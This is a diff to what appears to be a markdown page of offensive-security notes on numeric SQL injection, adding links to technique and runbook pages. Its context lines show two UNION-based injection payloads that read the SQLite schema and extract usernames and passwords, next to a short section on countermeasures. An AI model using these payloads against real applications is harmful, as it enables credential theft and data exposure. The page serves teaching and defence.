@@ -22,6 +22,11 @@ news_id=1 UNION SELECT NULL,sql,NULL FROM sqlite_master --
 news_id=1 UNION SELECT NULL,username,password FROM users --
 ```
 
+## Techniques
+
+- [SQL injection](../../techniques/sqli.md)
+- [Server-side injection runbook](../../runbooks/injection.md)
+
 ## Counter moves
 
 SQL injection: numeric is the variant in play. Server-side validation and least privilege are what these reduce to. Seen from the other side, this sits in the blue notes on [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
